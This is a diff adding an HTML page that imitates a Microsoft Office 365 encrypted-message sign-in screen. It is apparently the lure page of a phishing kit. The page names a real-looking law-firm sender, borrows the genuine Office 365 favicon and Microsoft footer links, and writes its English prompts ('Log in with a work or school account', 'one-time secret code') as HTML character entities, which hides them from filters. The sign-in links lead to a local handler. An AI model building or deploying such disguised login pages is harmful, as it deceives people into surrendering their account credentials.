@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="fr-FR">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="e4ePage" content="authenticationpage.aspx" />
+        <title>Authentification de messages chiffrés</title>
+        <link rel="shortcut icon" href="https://r1.res.office365.com/owa/prem/15.20.4628.20/resources/images/0/favicon.ico" type="image/x-icon" />
+        <link rel="stylesheet" type="text/css" href="./sources/authentication.css" />
+
+        
+        <style>
+            .custom-container {
+                vertical-align: middle;
+                horizontal-align: middle;
+                margin-top: 150px;
+            }
+
+            .row {
+                max-width: 99%;
+                margin-left: 1%;
+                margin-right: -15px;
+            }
+
+            .custom-row {
+                margin-top: 25px;
+                text-align: center;
+                word-wrap: break-word;
+            }
+
+            .footer {
+                font-size: 13px;
+            }
+
+            .otp {
+                font-size: 16px;
+            }
+
+            .help-row {
+                margin-top: 45px;
+            }
+            .help {
+                font-size: 18px;
+            }
+            .account {
+                margin-left: 3%;
+                margin-right: 3%;
+            }
+            .header {
+                background-color: #ffffff;
+            }
+            .vcenter {
+                vertical-align: middle;
+            }
+            .signin {
+                cursor: pointer;
+            }
+            .header-image {
+                margin-top: 4px;
+                max-width: 100%;
+                max-height: 30px;
+                margin-bottom: 4px;
+            }
+            .header-text {
+                margin-top: 4px;
+                font-size: 15px;
+                color: #000000;
+                margin-left: 4px;
+                margin-right: 0px;
+                margin-bottom: 4px;
+            }
+
+            /* deal with high contrast display */
+            @media (-ms-high-contrast: none), (forced-colors: none) {
+                .signin-text {
+                    font-size: 18px;
+                    color: #0072c6;
+                }
+            }
+
+            @media (-ms-high-contrast: active), (forced-colors: active) {
+                .signin-text {
+                    font-size: 18px;
+                    forced-color-adjust: none;
+                    color: LinkText;
+                }
+            }
+        </style>
+    </head>
+    <body dir="ltr">
+        <header>
+            <div class="fluid-container">
+                <div class="col-xs-12 header">
+                    <div class="col-xs-6"><p class="text-left header-text">&#69;&#110;&#99;&#114;&#121;&#112;&#116;&#101;&#100;&#32;&#77;&#101;&#115;&#115;&#97;&#103;&#101;</p></div>
+                </div>
+            </div>
+        </header>
+
+        <main>
+            <div class="container">
+                <div class="row custom-container">
+                    <p class="row custom-row lead account"><span>bwoolsey@rcwoolseylaw.com</span> &#115;&#101;&#110;&#116;&#32;&#121;&#111;&#117;&#32;&#97;&#32;&#112;&#114;&#111;&#116;&#101;&#99;&#116;&#101;&#100;&#32;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#10;</p>
+
+                    <p class="row custom-row"><img class="lock" src="./sources/lock.png" alt="lock" /></p>
+                    <div class="row custom-row">
+                        <p class="lead account">&#76;&#111;&#103;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#118;&#105;&#101;&#119;&#32;&#116;&#104;&#101;&#32;&#109;&#101;&#115;&#115;&#97;&#103;&#101;</p>
+                    </div>
+                    <div id="signinButton" class="row custom-row signin">
+                        <button type="submit" style="border: none; background-color: #fff;">
+                            <img src="./sources/liveid.png" height="50" width="50" alt="" role="none" />
+                            <p class="signin-text">&#76;&#111;&#103;&#32;&#105;&#110;&#32;&#119;&#105;&#116;&#104;&#32;&#97;&#32;&#119;&#111;&#114;&#107;&#32;&#111;&#114;&#32;&#115;&#99;&#104;&#111;&#111;&#108;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</p>
+                        </button>
+                    </div>
+
+                    <p class="row custom-row signin">
+                        <a
+                            href="../Home/?domain="
+                            style="text-decoration: none; color: #ffffff; background-color: #0078d4; padding-left: 30px; padding-right: 30px; padding-top: 10px; padding-bottom: 10px;"
+                        >
+                            <b>&#76;&#111;&#103;&#32;&#105;&#110;&#32;&#117;&#115;&#105;&#110;&#103;&#32;&#97;&#32;&#111;&#110;&#101;&#45;&#116;&#105;&#109;&#101;&#32;&#115;&#101;&#99;&#114;&#101;&#116;&#32;&#99;&#111;&#100;&#101;&#10;</b>
+                        </a>
+                    </p>
+
+                    <p class="row help-row help text-center">
+                        <a target="_blank" href="../Home/?domain="&to=>&#89;&#111;&#117;&#32;&#110;&#101;&#101;&#100;&#32;&#104;&#101;&#108;&#112;&nbsp;?</a>
+                    </p>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <p class="row custom-row text-center footer"><a target="_blank" href="https://privacy.microsoft.com/en-us/privacystatement">&#67;&#111;&#110;&#102;&#105;&#100;&#101;&#110;&#116;&#105;&#97;&#108;&#105;&#116;&#121;&#32;&#100;&#101;&#99;&#108;&#97;&#114;&#97;&#116;&#105;&#111;&#110;</a></p>
+
+            <p class="row custom-row text-center footer"><a target="_blank" href="https://go.microsoft.com/fwlink/?linkid=2121428">&#65;&#99;&#99;&#101;&#115;&#115;&#105;&#98;&#105;&#108;&#105;&#116;&#121;&#58;&#32;&#112;&#97;&#114;&#116;&#105;&#97;&#108;&#108;&#121;&#32;&#99;&#111;&#109;&#112;&#108;&#105;&#97;&#110;&#116;</a></p>
+        </footer>
+    </body>
+</html>
